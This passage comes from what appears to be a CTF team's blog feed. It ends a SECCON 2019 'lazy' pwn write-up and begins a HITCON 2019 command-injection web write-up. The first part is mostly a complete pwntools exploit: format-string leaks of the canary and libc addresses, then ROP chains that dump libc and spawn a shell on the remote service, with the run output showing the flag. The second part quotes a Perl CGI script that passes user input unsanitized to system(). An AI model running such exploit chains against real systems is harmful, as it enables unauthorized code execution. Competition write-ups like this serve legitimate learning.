target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CDlX5wI.png" alt><br></a><br>The offset to <strong>puts</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NeNlo6c.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NeNlo6c.png" alt><br></a><br>The functions that I used to leak addresses:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Leaks from the stack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSi</span><span class="params">(i)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'%&#123;&#125;$lx   '</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from an address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    s = <span class="string">'%7$s    '</span></span><br><span class="line">    s += p64(addr)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, s)</span><br></pre></td></tr></table></figure><p>Leaking the <strong>addresses</strong>, calculating offsets to <strong>libc</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">leakFMTSaddr(elf.got[<span class="string">'puts'</span>]) <span class="comment"># canary</span></span><br><span class="line">r.recv(<span class="number">0xb</span>)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS<span class="number">-0x67880</span></span><br><span class="line">SYSTEM = LIBC+<span class="number">0x3f570</span></span><br><span class="line">BINSH = LIBC+<span class="number">0x163c38</span></span><br><span class="line">log.info(<span class="string">"PUTS 0x%x"</span>%PUTS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span>%BINSH)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'OK! Downloading...\n'</span>)</span><br><span class="line">    </span><br><span class="line">leakFMTSi(<span class="number">9</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">CANARY = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"CANARY 0x%x"</span>%CANARY)</span><br><span class="line"></span><br><span class="line">leakFMTSi(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">STACKADDR = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">STACKADDR += <span class="number">0x900</span> <span class="comment"># prevent a stupid printf error</span></span><br><span class="line">log.info(<span class="string">"STACKADDR 0x%x"</span>%STACKADDR)</span><br></pre></td></tr></table></figure><p>The final <strong>ropchain</strong> to get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    padding = <span class="string">'libc'</span>+<span class="string">'\x00'</span>*<span class="number">0x14</span></span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    ropchain = p64(POPRDI)</span><br><span class="line">    ropchain += p64(BINSH)</span><br><span class="line">    ropchain += p64(SYSTEM)</span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendline(padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">host, port = <span class="string">"lazy.chal.seccon.jp"</span>, <span class="string">"33333"</span></span><br><span class="line">filename = <span class="string">"./lazy"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp, pie=True, source=False, pscript=<span class="string">""</span>)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        <span class="keyword">if</span> source:</span><br><span class="line">            script += <span class="string">"b %s\n"</span>%(x)</span><br><span class="line">        <span class="keyword">elif</span> pie:</span><br><span class="line">            script += <span class="string">"b *%x\n"</span>%(PIE+x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span> % x</span><br><span class="line">    script += pscript</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'3: Exit\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'username : '</span>, username)</span><br><span class="line">    r.sendlineafter(<span class="string">'password : '</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadLazy</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'lazy'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Sending 14216 bytes'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'lazy'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.recvall(timeout=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from the stack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSi</span><span class="params">(i)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'%&#123;&#125;$lx   '</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from an address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    s = <span class="string">'%7$s    '</span></span><br><span class="line">    s += p64(addr)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">()</span>:</span></span><br><span class="line">    file = <span class="string">'libc'</span></span><br><span class="line">    padding = file+<span class="string">'\x00'</span>*(<span class="number">0x18</span>-len(file))</span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    POPRBP = <span class="number">0x0000000000400c70</span></span><br><span class="line">    POPRSIR15 = <span class="number">0x00000000004015f1</span></span><br><span class="line">    POPRSPR13R14R15 = <span class="number">0x00000000004015ed</span></span><br><span class="line">    LIBC_SO_6 = <span class="number">0x400689</span></span><br><span class="line">    PLACETOPIVOT = <span class="number">0x602050</span></span><br><span class="line">    </span><br><span class="line">    ropchain = p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">    ropchain += p64(LIBC_SO_6)</span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(LIBC_SO_6)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'open'</span>]) <span class="comment"># open("libc.so.6", 0)</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRBP)</span><br><span class="line">    ropchain += p64(STACKADDR+<span class="number">0xc0</span>) <span class="comment"># RBP = STACKADDR+0x90+0x30</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x401788</span>)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'atoi'</span>]) <span class="comment"># atoi(0x401788) which will do RDX = 0xa</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(STACKADDR+<span class="number">0xc0</span><span class="number">-0xdc</span>)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'read'</span>]) <span class="comment"># read(0, STACKADDR+0x90+0x30-0xdc, 0xa)</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(STACKADDR)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)    </span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">    ropchain += p64(<span class="number">0x400f4c</span>) <span class="comment"># fstat(fd=0x3, STACKADDR)</span></span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    padding = <span class="string">'libc'</span>+<span class="string">'\x00'</span>*<span class="number">0x14</span></span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    ropchain = p64(POPRDI)</span><br><span class="line">    ropchain += p64(BINSH)</span><br><span class="line">    ropchain += p64(SYSTEM)</span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendline(padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        <span class="comment">#debug(["login_source.c:49","login_source.c:32"], pie=False, source=True)</span></span><br><span class="line">        debug([<span class="number">0x40146c</span>,<span class="number">0x00000000004015f3</span>], pie=<span class="keyword">False</span>) <span class="comment"># chdir 0x4013da read 0x400d33</span></span><br><span class="line">    login(<span class="string">"_H4CK3R_"</span>, <span class="string">"3XPL01717"</span>)</span><br><span class="line">    <span class="comment">#downloadLazy()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    leakFMTSaddr(elf.got[<span class="string">'puts'</span>]) <span class="comment"># canary</span></span><br><span class="line">    r.recv(<span class="number">0xb</span>)</span><br><span class="line">    PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    LIBC = PUTS<span class="number">-0x67880</span></span><br><span class="line">    SYSTEM = LIBC+<span class="number">0x3f570</span></span><br><span class="line">    BINSH = LIBC+<span class="number">0x163c38</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"PUTS 0x%x"</span>%PUTS)</span><br><span class="line">    log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">    log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">    log.info(<span class="string">"BINSH 0x%x"</span>%BINSH)</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">'OK! Downloading...\n'</span>)</span><br><span class="line">    </span><br><span class="line">    leakFMTSi(<span class="number">9</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">    CANARY = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"CANARY 0x%x"</span>%CANARY)</span><br><span class="line">    leakFMTSi(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">    STACKADDR = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">    STACKADDR += <span class="number">0x900</span> <span class="comment"># prevent a stupid printf error</span></span><br><span class="line">    log.info(<span class="string">"STACKADDR 0x%x"</span>%STACKADDR)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">"libc.so.6"</span>):</span><br><span class="line">        exploit()</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        overflow()</span><br><span class="line">        r.sendline(p64(<span class="number">0x03</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">' bytes'</span>)</span><br><span class="line">        a = r.recvall()</span><br><span class="line">        <span class="comment">#print len(a)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'2: Login'</span> <span class="keyword">in</span> a <span class="keyword">or</span> len(a) == <span class="number">0</span>:</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'libc.so.6'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(a)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>Running it </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ python lazy.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/lazy/lazy'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done</span><br><span class="line">[*] PUTS 0x7f52ab072880</span><br><span class="line">[*] LIBC 0x7f52ab00b000</span><br><span class="line">[*] LIBC 0x7f52ab04a570</span><br><span class="line">[*] LIBC 0x7f52ab16ec38</span><br><span class="line">    0\x1f`OK! Downloading...</span><br><span class="line"></span><br><span class="line">[*] CANARY 0x76eb2783e56af300</span><br><span class="line">[*] STACKADDR 0x7ffead1298c0</span><br><span class="line">[+] Receiving all data: Done (3.49MB)</span><br><span class="line">[*] Closed connection to lazy.chal.seccon.jp port 33333</span><br><span class="line">[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done</span><br><span class="line">[*] PUTS 0x7fb92abf5880</span><br><span class="line">[*] LIBC 0x7fb92ab8e000</span><br><span class="line">[*] LIBC 0x7fb92abcd570</span><br><span class="line">[*] LIBC 0x7fb92acf1c38</span><br><span class="line">    0\x1f`OK! Downloading...</span><br><span class="line"></span><br><span class="line">[*] CANARY 0x2af46916b0743600</span><br><span class="line">[*] STACKADDR 0x7fff8cfe3ed0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome to private directory</span><br><span class="line">You can download contents <span class="keyword">in</span> this directory, but you can<span class="string">'t download contents with a dot in the name</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">Input file name</span></span><br><span class="line"><span class="string">Filename : libcOK! Downloading...</span></span><br><span class="line"><span class="string">./lib</span></span><br><span class="line"><span class="string">No such file!</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">810a0afb2c69f8864ee65f0bdca999d7_FLAG</span></span><br><span class="line"><span class="string">cat</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">ld.so</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string">run.sh</span></span><br><span class="line"><span class="string">$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG</span></span><br><span class="line"><span class="string">SECCON&#123;Keep_Going!_KEEP_GOING!_K33P_G01NG!&#125;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;lazy&lt;/p&gt;
&lt;p&gt;332&lt;/p&gt;
&lt;p&gt;lazy.chal.seccon.jp 33333&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1st-Stage&quot;&gt;&lt;a href=&quot;#1st-Stage&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="seccon2019" scheme="https://teamrocketist.github.io/tags/seccon2019/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Hitcon 2019 - Virtual Public Network</title>
    <link href="https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/"/>
    <id>https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/</id>
    <published>2019-10-14T15:18:51.000Z</published>
    <updated>2019-10-14T17:08:46.450Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Virtual Public Network [183pts]</p><p>Vulnerable Point of Your Network :)</p><p><a href="http://13.231.137.9" target="_blank" rel="noopener">http://13.231.137.9</a></p><p>Author: 🍊Orange</p><p>81 Teams solved.</p></blockquote><p>We have have a web interface where we can control <strong>tcpdump command</strong> via options parameter this immediately hints for a command injection challenge, after inspecting the code we could see some hints in a html comment:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'container'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'row justify-content-center'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">"font-size: 200%"</span>&gt;</span> Virtual <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">red</span>&gt;</span>"Public"<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span> Network <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Hint for you :)</span></span><br><span class="line"><span class="comment">     &lt;a href='diag.cgi'&gt;diag.cgi&lt;/a&gt;</span></span><br><span class="line"><span class="comment">     &lt;a href='DSSafe.pm'&gt;DSSafe.pm&lt;/a&gt;  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'row justify-content-center'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Cgi scripts outside cgi-bin folder won’t execute instead we will be able to view its source code so lets inspect <strong>diag.cgi</strong> first:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> lib <span class="string">'/var/www/html/'</span>;</span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI ();</span><br><span class="line"><span class="keyword">use</span> DSSafe;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">tcpdump_options_syntax_check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $options = <span class="keyword">shift</span>;</span><br><span class="line">    <span class="keyword">return</span> $options <span class="keyword">if</span> <span class="keyword">system</span>(<span class="string">"timeout -s 9 2 /usr/bin/tcpdump -d $options &gt;/dev/null 2&gt;&amp;1"</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">undef</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">my</span> $options = CGI::param(<span class="string">"options"</span>);</span><br><span class="line"><span class="keyword">my</span> $output = tcpdump_options_syntax_check($options);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># backdoor :)</span></span><br><span class="line"><span class="keyword">my</span> $tpl = CGI::param(<span class="string">"tpl"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">length</span> $tpl &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">index</span>($tpl, <span class="string">".."</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    $tpl = <span class="string">"./tmp/"</span> . $tpl . <span class="string">".thtml"</span>;</span><br><span class="line">    <span class="keyword">require</span>($tpl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This would be a very easy challenge if it wasn’t for <strong>use DSSafe;</strong> after some search online I ended up at the challenge author <a 